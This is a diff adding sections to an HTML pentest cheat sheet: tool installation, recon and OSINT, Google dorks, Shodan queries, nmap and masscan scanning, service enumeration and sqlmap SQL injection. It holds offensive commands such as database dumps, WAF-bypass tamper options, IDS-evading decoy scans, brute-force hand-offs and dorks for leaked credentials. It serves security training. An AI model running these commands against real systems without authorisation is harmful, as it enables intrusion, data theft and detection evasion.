+      <div class="term"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">check tools</div></div>
+        <pre><span class="c"># Verify installed runtimes:</span>
+python3 --version    <span class="c"># → 3.x.x</span>
+node --version       <span class="c"># → v20.x.x</span>
+go version           <span class="c"># → go1.21+</span>
+ruby --version       <span class="c"># → 3.x.x</span>
+rustc --version      <span class="c"># → 1.x.x</span>
+
+<span class="c"># Verify hack tools:</span>
+nmap --version
+sqlmap --version
+subfinder -version
+nuclei -version
+ffuf -V
+
+<span class="c"># If tools not found:</span>
+source ~/.zshrc       <span class="c"># reload PATH</span>
+which subfinder       <span class="c"># should show ~/.go/bin/subfinder</span></pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 03 NODE.JS ══════════════════════════════════════════ -->
+<div class="sec" id="nodejs">
+  <div class="st">NODE<span class="np">.JS</span></div>
+  <div class="sd">NODE.JS 20 LTS · NPM · NVM — AUTO-INSTALLED BY SETUP</div>
+  <div class="al ap">Auto-installed via nvm (macOS) or NodeSource (Linux). npm-global PATH permanently added to ~/.zshrc.</div>
+
+  <div class="ex ep"><strong>Why nvm instead of apt install nodejs?</strong> <code>apt install nodejs</code> on Ubuntu 20.04 gives Node.js v12 — way too old for modern tools (BeEF, wappalyzer-cli need v18+). <strong>nvm</strong> always installs the exact version, multiple versions in parallel, no sudo needed. <strong>NodeSource</strong> is the official Node.js Linux repo — always current.</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt cp">nvm — Key Commands</div>
+      <table class="ct">
+        <tr><td>nvm install 20</td><td>Install Node.js 20 LTS</td><td>Recommended stable version</td></tr>
+        <tr><td>nvm install --lts</td><td>Latest LTS</td><td>Always newest LTS</td></tr>
+        <tr><td>nvm use 20</td><td>Activate version</td><td>Current shell only</td></tr>
+        <tr><td>nvm alias default 20</td><td>Set default</td><td>Applies to all new shells</td></tr>
+        <tr><td>nvm ls</td><td>Installed versions</td><td>Locally available</td></tr>
+        <tr><td>nvm current</td><td>Active version</td><td>Which version is running</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt cp">npm — Global Tools</div>
+      <table class="ct">
+        <tr><td>npm install -g retire</td><td>Find CVEs in JS libs</td><td>Scan web apps for vulnerable libraries</td></tr>
+        <tr><td>npm install -g wappalyzer-cli</td><td>Detect web technologies</td><td>Framework, CMS, server software</td></tr>
+        <tr><td>npm config set prefix ~/.npm-global</td><td>Set prefix</td><td>No sudo for global packages</td></tr>
+        <tr><td>npm list -g</td><td>Show global packages</td><td>What is installed?</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cp">PATH — Added to ~/.zshrc automatically</div>
+    <div class="term tp"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">~/.zshrc entries</div></div>
+      <pre><span class="c"># These lines are added by setup to ~/.zshrc:</span>
+
+<span class="c"># nvm</span>
+export NVM_DIR="$HOME/.nvm"
+[ -s "$NVM_DIR/nvm.sh" ] && source "$NVM_DIR/nvm.sh"
+
+<span class="c"># npm global (no sudo)</span>
+export PATH="$HOME/.npm-global/bin:$PATH"
+
+<span class="c"># Go tools</span>
+export GOPATH="$HOME/go"
+export PATH="$GOPATH/bin:$PATH"
+
+<span class="c"># Rust/cargo</span>
+export PATH="$HOME/.cargo/bin:$PATH"
+
+<span class="c"># Activate now:</span>
+source ~/.zshrc
+node --version    <span class="c"># → v20.x.x</span>
+go version        <span class="c"># → go1.21+</span></pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 04 PYTHON ══════════════════════════════════════════ -->
+<div class="sec" id="python">
+  <div class="st">PY<span class="np">THON</span></div>
+  <div class="sd">PYTHON 3 · PIP · ALL HACKING LIBRARIES EXPLAINED</div>
+
+  <div class="ex ep"><strong>What Python needs for pentesting:</strong> Not just <code>python3</code> — many libs need <strong>header files</strong> (python3-dev) and compiler libs (libssl-dev, libffi-dev). Without these, <code>pip install cryptography</code>, <code>paramiko</code>, and <code>impacket</code> will fail. On newer systems (Python 3.11+) you need <code>--break-system-packages</code> or a venv.</div>
+
+  <div class="cb">
+    <div class="cbt cp">Key pip packages</div>
+    <table class="ct">
+      <tr><th>Package</th><th>Used for</th><th>System dependencies</th></tr>
+      <tr><td>impacket</td><td>SMB, NTLM, Kerberos attacks</td><td>libssl-dev, libffi-dev, python3-dev</td></tr>
+      <tr><td>certipy-ad</td><td>AD Certificate Services (ESC1-8)</td><td>impacket, ldap3</td></tr>
+      <tr><td>bloodhound</td><td>Collect BloodHound data without Windows</td><td>impacket, ldap3, dnspython</td></tr>
+      <tr><td>pwntools</td><td>Buffer overflow, ROP chains, CTF</td><td>python3-dev, libssl-dev, libffi-dev</td></tr>
+      <tr><td>scapy</td><td>Packet crafting and capture</td><td>libpcap-dev (for capture)</td></tr>
+      <tr><td>paramiko</td><td>SSH2 in Python (custom scripts)</td><td>cryptography, bcrypt</td></tr>
+      <tr><td>volatility3</td><td>Memory forensics (RAM dump analysis)</td><td>pefile, capstone</td></tr>
+      <tr><td>shodan</td><td>Shodan CLI + Python API</td><td>requests, click</td></tr>
+      <tr><td>mitmproxy</td><td>MITM proxy, intercept HTTPS</td><td>Python 3.8+</td></tr>
+    </table>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cp">pip install — Problems &amp; Solutions</div>
+    <div class="term tp"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">pip troubleshooting</div></div>
+      <pre><span class="c"># Python 3.11+: "externally-managed-environment" error</span>
+pip3 install impacket --break-system-packages
+
+<span class="c"># Or: Virtual Environment (cleanest method)</span>
+python3 -m venv ~/pentest-venv
+source ~/pentest-venv/bin/activate
+pip install impacket pwntools scapy
+
+<span class="c"># Error: "fatal error: openssl/aes.h: No such file"</span>
+sudo apt install libssl-dev     <span class="c"># Linux</span>
+brew install openssl@3          <span class="c"># macOS</span>
+
+<span class="c"># Error: "_cffi_backend" ImportError</span>
+sudo apt install libffi-dev python3-dev
+
+<span class="c"># List all installed packages:</span>
+pip3 list
+pip3 list --outdated</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 05 GO TOOLS ════════════════════════════════════════ -->
+<div class="sec" id="golang">
+  <div class="st">GO<span class="np"> TOOLS</span></div>
+  <div class="sd">GO-BASED HACKING TOOLS — SUBFINDER · NUCLEI · FFUF · HTTPX · KATANA</div>
+
+  <div class="ex ep"><strong>Why Go for pentest tools?</strong> Go compiles to static binaries — zero dependencies. Go tools are <em>extremely fast</em> (subfinder, nuclei, ffuf run in seconds where Python equivalents take minutes). Install: <code>go install github.com/.../tool@latest</code> downloads, compiles and places the binary in <code>$GOPATH/bin/</code>. <span class="how">Requirement:</span> Go 1.21+ and correct PATH.</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt cp">ProjectDiscovery Suite</div>
+      <table class="ct">
+        <tr><th>Tool</th><th>Purpose</th><th>Install</th></tr>
+        <tr><td>subfinder</td><td>Passive subdomain discovery</td><td>go install ...subfinder/v2/cmd/subfinder@latest</td></tr>
+        <tr><td>httpx</td><td>HTTP probing + tech detection</td><td>go install ...httpx/cmd/httpx@latest</td></tr>
+        <tr><td>nuclei</td><td>Template-based vulnerability scanner</td><td>go install ...nuclei/v3/cmd/nuclei@latest</td></tr>
+        <tr><td>naabu</td><td>Fast port scanner (SYN/CONNECT)</td><td>go install ...naabu/v2/cmd/naabu@latest</td></tr>
+        <tr><td>dnsx</td><td>DNS resolver/brute-forcer</td><td>go install ...dnsx/cmd/dnsx@latest</td></tr>
+        <tr><td>katana</td><td>Next-gen web crawler + JS parsing</td><td>go install ...katana/cmd/katana@latest</td></tr>
+        <tr><td>interactsh</td><td>OOB interaction server (like Burp Collaborator)</td><td>go install ...interactsh-client@latest</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt cp">TomNomNom + Others</div>
+      <table class="ct">
+        <tr><td>ffuf</td><td>Web fuzzer (dirs, params, vhosts)</td><td>Faster than gobuster for most tasks</td></tr>
+        <tr><td>gobuster</td><td>Directory/DNS/vhost brute-force</td><td>Good for DNS mode</td></tr>
+        <tr><td>waybackurls</td><td>Wayback Machine URL extraction</td><td>Finds old endpoints</td></tr>
+        <tr><td>assetfinder</td><td>Subdomain finder (crt.sh, HackerTarget)</td><td>Fast, passive only</td></tr>
+        <tr><td>gf</td><td>grep patterns for bug bounty</td><td>XSS, sqli, ssrf, redirect patterns</td></tr>
+        <tr><td>anew</td><td>Append unique lines only</td><td>Pipeline deduplication</td></tr>
+        <tr><td>gau</td><td>Get All URLs (Wayback + OTX + CC)</td><td>Massive historical URL collection</td></tr>
+        <tr><td>amass</td><td>Full OSINT attack surface mapping</td><td>Active + passive, most comprehensive</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cp">Recon Pipeline Example</div>
+    <div class="term tp"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">full recon pipeline</div></div>
+      <pre><span class="c"># Full subdomain → live hosts → vuln scan pipeline</span>
+TARGET="example.com"
+
+subfinder -d $TARGET -silent | \
+  dnsx -silent | \
+  httpx -silent -o live.txt
+
+<span class="c"># Crawl all live hosts</span>
+katana -list live.txt -silent -o endpoints.txt
+
+<span class="c"># Scan with nuclei templates</span>
+nuclei -l live.txt -t ~/nuclei-templates/ -o findings.txt
+
+<span class="c"># Collect all URLs (Wayback + GAU)</span>
+echo $TARGET | gau --threads 5 > all_urls.txt
+echo $TARGET | waybackurls >> all_urls.txt
+sort -u all_urls.txt > unique_urls.txt
+
+<span class="c"># Find potential injection points</span>
+cat unique_urls.txt | gf sqli > sqli_candidates.txt
+cat unique_urls.txt | gf xss  > xss_candidates.txt</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 06 RECON & OSINT ════════════════════════════════════ -->
+<div class="sec" id="recon">
+  <div class="st">RE<span>CON</span></div>
+  <div class="sd">OSINT · SUBDOMAIN ENUM · DNS · GOOGLE DORKS · SHODAN · CERTIFICATES</div>
+  <div class="ex"><strong>What is Recon?</strong> First phase of every pentest — gather information before attacking. <strong>Passive:</strong> no direct contact (Google, WHOIS, Shodan, Certificate Transparency — leaves no logs on target). <strong>Active:</strong> direct contact (DNS queries, subdomain brute-force) — leaves traces. Good recon = the difference between success and failure.</div>
+
+  <div class="cb">
+    <div class="cbt">SUBDOMAIN ENUMERATION</div>
+    <table class="ct">
+      <tr><th>Command</th><th>Tool</th><th>Notes</th></tr>
+      <tr><td>subfinder -d target.com -all -silent -o subs.txt</td><td>subfinder</td><td>50+ passive sources — no direct contact</td></tr>
+      <tr><td>assetfinder --subs-only target.com >> subs.txt</td><td>assetfinder</td><td>crt.sh, HackerTarget, Facebook</td></tr>
+      <tr><td>amass enum -passive -d target.com -o amass.txt</td><td>amass</td><td>Most thorough — slow, many sources</td></tr>
+      <tr><td>amass enum -active -d target.com -brute</td><td>amass active</td><td>DNS brute-force — leaves logs!</td></tr>
+      <tr><td>dnsx -l subs.txt -a -resp -silent -o resolved.txt</td><td>dnsx</td><td>Resolves IPs for each subdomain</td></tr>
+      <tr><td>httpx -l resolved.txt -silent -status-code -title -tech-detect -o live.txt</td><td>httpx</td><td>Finds live web servers + tech stack</td></tr>
+      <tr><td>cat subs.txt | sort -u | anew master_subs.txt</td><td>anew</td><td>Deduplicate, only add new lines</td></tr>
+      <tr><td>zsh 08_scripts/subdomain_enum.zsh target.com</td><td>custom</td><td>Runs full pipeline, saves to 11_reports/</td></tr>
+    </table>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">FULL RECON PIPELINE</div>
+    <div class="term"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">complete recon pipeline</div></div>
+      <pre><span class="c"># Full passive → active → live → scan pipeline</span>
+TARGET="target.com"
+
+<span class="c"># 1. Collect subdomains (passive — no contact with target)</span>
+subfinder -d $TARGET -all -silent | anew subs.txt
+assetfinder --subs-only $TARGET | anew subs.txt
+echo $TARGET | gau --threads 5 | grep -oP "https?://[^/]+" | sort -u | anew subs.txt
+
+<span class="c"># 2. Resolve to IPs</span>
+dnsx -l subs.txt -a -resp -silent | anew resolved.txt
+
+<span class="c"># 3. Probe live web servers</span>
+httpx -l resolved.txt -silent -status-code -title -tech-detect -o live.txt
+
+<span class="c"># 4. Crawl all live hosts</span>
+katana -list live.txt -silent -o endpoints.txt
+
+<span class="c"># 5. Collect all historical URLs</span>
+echo $TARGET | waybackurls >> all_urls.txt
+echo $TARGET | gau >> all_urls.txt
+sort -u all_urls.txt > unique_urls.txt
+
+<span class="c"># 6. Find injection points</span>
+cat unique_urls.txt | gf sqli  > sqli_candidates.txt
+cat unique_urls.txt | gf xss   > xss_candidates.txt
+cat unique_urls.txt | gf ssrf  > ssrf_candidates.txt
+cat unique_urls.txt | gf lfi   > lfi_candidates.txt
+cat unique_urls.txt | gf redirect > redirect_candidates.txt
+
+<span class="c"># 7. Nuclei on live hosts</span>
+nuclei -l live.txt -t cves/ -t misconfigurations/ -severity high,critical -o nuclei.txt</pre>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">theHarvester — Emails & Subdomains</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> Queries Google, Bing, LinkedIn, Hunter.io, Shodan and 20+ sources. No direct contact with target. Finds email addresses, employee names, open ports.</div>
+      <table class="ct">
+        <tr><td>theHarvester -d target.com -b all</td><td>All sources</td><td>~20 APIs simultaneously</td></tr>
+        <tr><td>theHarvester -d target.com -b google,linkedin</td><td>Selection</td><td>Google + LinkedIn for emails + staff</td></tr>
+        <tr><td>theHarvester -d target.com -b all -f report</td><td>HTML report</td><td>report.html + report.xml</td></tr>
+        <tr><td>theHarvester -d target.com -l 500 -b google</td><td>More results</td><td>-l = limit (default: 100)</td></tr>
+        <tr><td>theHarvester -d target.com -b shodan</td><td>Shodan via API</td><td>Set SHODAN_API_KEY env var first</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Sherlock — Username Search</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> HTTP requests to 400+ websites — checks if /user/USERNAME exists. No login needed, fully passive. Great for tracking personas across platforms.</div>
+      <table class="ct">
+        <tr><td>python3 sherlock.py username</td><td>400+ platforms</td><td>GitHub, Twitter, Reddit, Steam...</td></tr>
+        <tr><td>sherlock --print-found username</td><td>Hits only</td><td>Suppresses "Not Found"</td></tr>
+        <tr><td>sherlock --timeout 10 username</td><td>With timeout</td><td>10s per site, then skip</td></tr>
+        <tr><td>sherlock user1 user2 user3</td><td>Multiple in parallel</td><td>All searched simultaneously</td></tr>
+        <tr><td>sherlock --output results.txt username</td><td>Save to file</td><td>One hit per line</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">GOOGLE DORKS — Search Engine as OSINT Tool</div>
+    <div class="ex"><strong>How:</strong> Google indexes everything — including things that shouldn't be public. Special operators find admin panels, config files, database backups. 100% passive — no contact with target at all.</div>
+    <table class="ct">
+      <tr><th>Dork</th><th>Finds</th><th>Why interesting</th></tr>
+      <tr><td>site:target.com ext:env OR ext:conf OR ext:yml</td><td>Config files</td><td>.env with API keys, DB passwords</td></tr>
+      <tr><td>site:target.com inurl:admin OR inurl:login OR inurl:dashboard</td><td>Admin panels</td><td>Forgotten, unprotected areas</td></tr>
+      <tr><td>site:target.com ext:sql OR ext:db OR ext:bak OR ext:backup</td><td>DB backups</td><td>Full DB dumps publicly accessible</td></tr>
+      <tr><td>intitle:"index of" site:target.com</td><td>Open directories</td><td>Directory listing → all files visible</td></tr>
+      <tr><td>site:target.com inurl:.git OR inurl:.svn</td><td>Source repos</td><td>/.git/ exposed → full source downloadable</td></tr>
+      <tr><td>site:pastebin.com "target.com" password</td><td>Data breach leaks</td><td>Credentials dumped on Pastebin</td></tr>
+      <tr><td>site:target.com filetype:pdf OR filetype:docx confidential</td><td>Internal docs</td><td>Org charts, internal procedures</td></tr>
+      <tr><td>site:target.com ext:php inurl:?id= OR inurl:?page=</td><td>SQLi targets</td><td>Unsanitized GET parameters</td></tr>
+      <tr><td>cache:target.com/admin</td><td>Cached pages</td><td>See old version of removed pages</td></tr>
+      <tr><td>"target.com" site:github.com password OR apikey OR secret</td><td>GitHub leaks</td><td>Developers committing credentials</td></tr>
+    </table>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">DNS ENUMERATION</div>
+      <table class="ct">
+        <tr><td>dig target.com ANY</td><td>All DNS records</td><td>MX, TXT, NS, A, AAAA, CNAME</td></tr>
+        <tr><td>dig +short target.com TXT</td><td>TXT records</td><td>SPF, DMARC, verification tokens, API keys</td></tr>
+        <tr><td>dig axfr @ns1.target.com target.com</td><td>Zone transfer</td><td>Dumps ALL DNS records if misconfigured</td></tr>
+        <tr><td>dnsrecon -d target.com -t axfr</td><td>Auto zone transfer</td><td>Tries all nameservers</td></tr>
+        <tr><td>dnsx -d target.com -w subdomains.txt</td><td>Brute-force</td><td>Test common subdomain names</td></tr>
+        <tr><td>dig -x 1.2.3.4</td><td>Reverse lookup</td><td>IP → hostname</td></tr>
+        <tr><td>fierce --domain target.com</td><td>DNS recon</td><td>Zone transfer + brute-force</td></tr>
+        <tr><td>nslookup -type=mx target.com</td><td>Mail servers</td><td>Find email infrastructure</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">CERTIFICATE TRANSPARENCY</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> Every SSL cert is logged publicly in CT logs. Search them to find subdomains that have SSL certs — including internal, staging, and dev systems. No contact with target.</div>
+      <table class="ct">
+        <tr><td>curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u</td><td>crt.sh JSON</td><td>All certs for *.target.com</td></tr>
+        <tr><td>curl -s "https://crt.sh/?q=target.com" | grep -oP '(?&lt;=&gt;)[^&lt;]+\.target\.com'</td><td>crt.sh HTML</td><td>Parse directly</td></tr>
+        <tr><td>subfinder -d target.com -s certspotter,censys</td><td>Via subfinder</td><td>Certspotter + Censys CT sources</td></tr>
+        <tr><td>amass enum -d target.com -src -ip</td><td>amass + CT</td><td>Includes CT logs automatically</td></tr>
+        <tr><td>openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -text</td><td>Read cert</td><td>See SAN (Subject Alt Names)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">SHODAN — Search Engine for the Internet</div>
+    <div class="ex"><strong>How:</strong> Permanently scans all public IPs and stores banners, SSL certs, metadata. You're searching Shodan's database — not attacking anything. Finds MongoDB without passwords, default credentials on cameras/routers, outdated software with known CVEs. <span class="how">Free API key:</span> shodan.io → register → copy key.</div>
+    <table class="ct">
+      <tr><th>Query</th><th>Finds</th><th>Notes</th></tr>
+      <tr><td>shodan init YOUR_API_KEY</td><td>Setup</td><td>Run once, saves key to ~/.shodan/api_key</td></tr>
+      <tr><td>shodan search 'org:"Target Corp"'</td><td>All IPs of org</td><td>All exposed services of a company</td></tr>
+      <tr><td>shodan search 'ssl.cert.subject.cn:*.target.com'</td><td>SSL subdomains</td><td>Find all subdomains via SSL certs</td></tr>
+      <tr><td>shodan search 'apache version:2.4.49'</td><td>Vulnerable versions</td><td>CVE-2021-41773 → instant exploit</td></tr>
+      <tr><td>shodan search 'product:"MongoDB" -authentication'</td><td>Open databases</td><td>MongoDB without auth → direct dump</td></tr>
+      <tr><td>shodan search 'vuln:CVE-2021-44228'</td><td>Log4Shell hosts</td><td>Still vulnerable Log4j instances</td></tr>
+      <tr><td>shodan host 1.2.3.4</td><td>IP details</td><td>Open ports, banners, CVEs, geo</td></tr>
+      <tr><td>shodan search 'default password' port:23</td><td>Telnet devices</td><td>Routers, cameras with default creds</td></tr>
+      <tr><td>shodan search 'http.title:"Dashboard" http.favicon.hash:-1326058233'</td><td>Grafana instances</td><td>Find exposed monitoring dashboards</td></tr>
+      <tr><td>shodan count 'product:nginx country:CH'</td><td>Stats</td><td>How many nginx servers in Switzerland</td></tr>
+    </table>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">WHOIS & IP INTEL</div>
+    <table class="ct">
+      <tr><td>whois target.com</td><td>Domain registration</td><td>Owner, registrar, nameservers, dates</td></tr>
+      <tr><td>whois 1.2.3.4</td><td>IP registration</td><td>ASN, organization, CIDR range</td></tr>
+      <tr><td>curl ipinfo.io/1.2.3.4</td><td>IP geolocation</td><td>City, country, ISP, ASN</td></tr>
+      <tr><td>curl https://api.hackertarget.com/reverseiplookup/?q=1.2.3.4</td><td>Reverse IP</td><td>All domains hosted on same IP</td></tr>
+      <tr><td>curl https://api.hackertarget.com/aslookup/?q=AS15169</td><td>ASN lookup</td><td>All IPs in an ASN (e.g. Google = AS15169)</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 07 SCANNING ════════════════════════════════════════ -->
+<div class="sec" id="scanning">
+  <div class="st">SCAN<span>NING</span></div>
+  <div class="sd">NMAP · MASSCAN · RUSTSCAN · NSE SCRIPTS · SERVICE ENUMERATION</div>
+  <div class="ex"><strong>TCP Port Scan basics:</strong> SYN → SYN-ACK = open. SYN → RST = closed. No response = filtered (firewall). <strong>Stealth Scan (-sS):</strong> no full handshake → fewer logs on target. Always start with a quick scan, then go deep on found ports. nmap-vulners NSE script is auto-installed and shows CVEs for found services.</div>
+
+  <div class="cb">
+    <div class="cbt">NMAP — FULL REFERENCE</div>
+    <table class="ct">
+      <tr><th>Command</th><th>What</th><th>Notes</th></tr>
+      <tr><td>nmap -sV -sC target</td><td>Version + default scripts</td><td>-sV: banner grabbing. -sC: http-title, ssh-hostkey...</td></tr>
+      <tr><td>nmap -p- -T4 --open target</td><td>All 65535 ports</td><td>Default scans only top 1000</td></tr>
+      <tr><td>nmap -sS -T4 target</td><td>Stealth SYN fast</td><td>No full handshake → fewer logs</td></tr>
+      <tr><td>nmap -A target</td><td>Aggressive (everything)</td><td>OS + versions + scripts + traceroute</td></tr>
+      <tr><td>nmap -sU -p 53,161,500,1194 target</td><td>UDP scan</td><td>DNS, SNMP, IKE, OpenVPN — often forgotten</td></tr>
+      <tr><td>nmap -sn 192.168.1.0/24</td><td>Ping sweep</td><td>Host discovery only, no port scan</td></tr>
+      <tr><td>nmap -sV --version-intensity 9 target</td><td>Deep version detection</td><td>0=fastest, 9=most thorough</td></tr>
+      <tr><td>nmap -p 80,443 --script http-enum target</td><td>HTTP enumeration</td><td>Finds /admin, /phpmyadmin, /wp-admin...</td></tr>
+      <tr><td>nmap --script vulners -sV target</td><td>CVEs per service</td><td>nmap-vulners NSE — requires -sV!</td></tr>
+      <tr><td>nmap --script vuln target</td><td>All vuln scripts</td><td>Heartbleed, EternalBlue, Shellshock, ms17-010</td></tr>
+      <tr><td>nmap --script smb-vuln* target</td><td>SMB vulnerabilities</td><td>MS17-010 (EternalBlue/WannaCry)</td></tr>
+      <tr><td>nmap --script smb-enum-shares,smb-enum-users target</td><td>SMB enum</td><td>List shares + users without auth</td></tr>
+      <tr><td>nmap -D RND:10 target</td><td>Decoy scan</td><td>10 random IPs — hides real IP in logs</td></tr>
+      <tr><td>nmap -f target</td><td>Fragment packets</td><td>Split packets → evade some IDS/IPS</td></tr>
+      <tr><td>nmap --open -oA output target</td><td>Open ports + all formats</td><td>-oA = .nmap + .xml + .gnmap</td></tr>
+      <tr><td>nmap -iL targets.txt -oX scan.xml</td><td>Scan from list</td><td>One target per line, XML output for MSF</td></tr>
+      <tr><td>nmap --script ssl-heartbleed -p 443 target</td><td>Heartbleed check</td><td>CVE-2014-0160</td></tr>
+      <tr><td>nmap --script ftp-anon,ftp-bounce target</td><td>FTP checks</td><td>Anonymous login, bounce attack</td></tr>
+    </table>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">Masscan — Ultra Fast</div>
+      <div class="ex" style="font-size:11px;"><strong>Why fast:</strong> Own TCP/IP stack, bypasses OS. 25M packets/sec. For huge IP ranges — find open ports then use nmap for details.</div>
+      <table class="ct">
+        <tr><td>masscan -p80,443,8080,8443 10.0.0.0/8 --rate=10000</td><td>Web ports /8</td><td>16M IPs in minutes</td></tr>
+        <tr><td>masscan -p1-65535 target --rate=1000</td><td>All ports</td><td>Low rate for single hosts</td></tr>
+        <tr><td>masscan -p0-65535 target -oX out.xml</td><td>XML output</td><td>Import into Metasploit: db_import</td></tr>
+        <tr><td>masscan -p22 192.168.0.0/16 --rate=5000 | awk '{print $6}' > ssh_hosts.txt</td><td>Find all SSH</td><td>Pipe to hydra for bruteforce</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">RustScan — Fast Port Discovery</div>
+      <div class="ex" style="font-size:11px;"><strong>Workflow:</strong> RustScan finds open ports in seconds → hands them to nmap for service detection. Best of both worlds.</div>
+      <table class="ct">
+        <tr><td>rustscan -a target -- -sV -sC</td><td>Fast scan + nmap</td><td>Finds all ports, nmap does service detection</td></tr>
+        <tr><td>rustscan -a target -p 1-65535 --ulimit 5000</td><td>All ports</td><td>--ulimit increases open file limit</td></tr>
+        <tr><td>rustscan -a 192.168.1.0/24 -- -sV</td><td>Network range</td><td>Full subnet in seconds</td></tr>
+        <tr><td>rustscan -a target -b 500 -t 2000</td><td>Tuning</td><td>-b=batch size, -t=timeout ms</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">SERVICE ENUMERATION</div>
+    <table class="ct">
+      <tr><th>Service</th><th>Command</th><th>What to look for</th></tr>
+      <tr><td>SMB (445)</td><td>enum4linux -a target</td><td>Users, shares, groups, password policy, OS</td></tr>
+      <tr><td>SMB anon</td><td>smbclient -L //target -N</td><td>-N = no password (null session)</td></tr>
+      <tr><td>SMB connect</td><td>smbclient //target/share -U user</td><td>Browse share, get/put files</td></tr>
+      <tr><td>SNMP (161)</td><td>snmpwalk -v2c -c public target</td><td>"public" = default community → system info</td></tr>
+      <tr><td>SNMP enum</td><td>snmp-check target -c public</td><td>Users, processes, interfaces, routing table</td></tr>
+      <tr><td>LDAP (389)</td><td>ldapsearch -x -H ldap://target -b ""</td><td>Anonymous bind → AD users, groups, OUs</td></tr>
+      <tr><td>Redis (6379)</td><td>redis-cli -h target info</td><td>No auth → CONFIG GET * → all keys</td></tr>
+      <tr><td>FTP (21)</td><td>ftp target → user: anonymous</td><td>Anonymous login → read/write access</td></tr>
+      <tr><td>MySQL (3306)</td><td>mysql -h target -u root -p</td><td>Blank password: mysql -h target -u root</td></tr>
+      <tr><td>RPC (111)</td><td>rpcinfo -p target</td><td>List RPC services, NFS exports</td></tr>
+      <tr><td>NFS</td><td>showmount -e target</td><td>List NFS exports → mount -t nfs target:/share /mnt</td></tr>
+      <tr><td>SMTP (25)</td><td>nc target 25 → VRFY user</td><td>User enumeration via VRFY/EXPN</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 08 WEB HACKING ═════════════════════════════════════ -->
+<div class="sec" id="web">
+  <div class="st">WEB<span> HACK</span></div>
+  <div class="sd">SQL INJECTION · XSS · LFI · SSRF · SSTI · COMMAND INJECTION · API · XXE</div>
+
+  <div class="cb">
+    <div class="cbt">DIRECTORY DISCOVERY</div>
+    <div class="ex"><strong>How:</strong> Sends HTTP requests for thousands of possible paths and checks status codes. 200=found, 403=exists (no access), 404=not there. Typical finds: /admin without password, /.git with source code, /backup.zip, /api/v2.</div>
+    <table class="ct">
+      <tr><td>gobuster dir -u http://target -w common.txt -x php,html,bak,txt -t 40</td><td>With extensions</td><td>Tests /admin, /admin.php, /admin.bak</td></tr>
+      <tr><td>ffuf -u http://target/FUZZ -w wl.txt -fc 404,403 -fs 0 -mc all</td><td>FFUF with filter</td><td>-fc=filter code, -fs=filter size, -mc=match all</td></tr>
+      <tr><td>ffuf -u http://target -H "Host: FUZZ.target.com" -w subs.txt -fw 1</td><td>Virtual host fuzzing</td><td>Internal subdomains via Host header</td></tr>
+      <tr><td>ffuf -u http://target/FUZZ -w wl.txt -recursion -recursion-depth 3</td><td>Recursive</td><td>Automatically recurse into found directories</td></tr>
+      <tr><td>feroxbuster -u http://target --depth 3 -x php,html,js</td><td>Recursive auto</td><td>/admin → /admin/users automatically</td></tr>
+      <tr><td>gobuster dns -d target.com -w subdomains.txt -t 30</td><td>DNS mode</td><td>Subdomain brute-force via DNS</td></tr>
+    </table>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">SQL INJECTION</div>
+    <div class="ex"><strong>How SQLi works:</strong> <code>SELECT * FROM users WHERE id = [USER_INPUT]</code> → Input <code>1 OR 1=1--</code> → Returns ALL users. With UNION: read arbitrary tables. With MySQL as root: execute OS commands. <span class="how">SQLMap automates</span> everything from detection to dump and OS shell.</div>
+    <table class="ct">
+      <tr><td>sqlmap -u "http://t.com/page?id=1"</td><td>Basic test</td><td>Auto-test all GET parameters</td></tr>
+      <tr><td>sqlmap -u URL --dbs</td><td>List databases</td><td>All database names</td></tr>
+      <tr><td>sqlmap -u URL -D db --tables</td><td>List tables</td><td>All table names in DB</td></tr>
+      <tr><td>sqlmap -u URL -D db -T users --dump</td><td>Dump table</td><td>All rows including password hashes</td></tr>
+      <tr><td>sqlmap -u URL -D db -T users -C user,pass --dump</td><td>Specific columns</td><td>Only selected columns</td></tr>
+      <tr><td>sqlmap -r request.txt --level=5 --risk=3</td><td>Burp request aggressive</td><td>Export raw request from Burp Suite</td></tr>
+      <tr><td>sqlmap -u URL --tamper=space2comment,between</td><td>WAF bypass</td><td>Combine tamper scripts</td></tr>
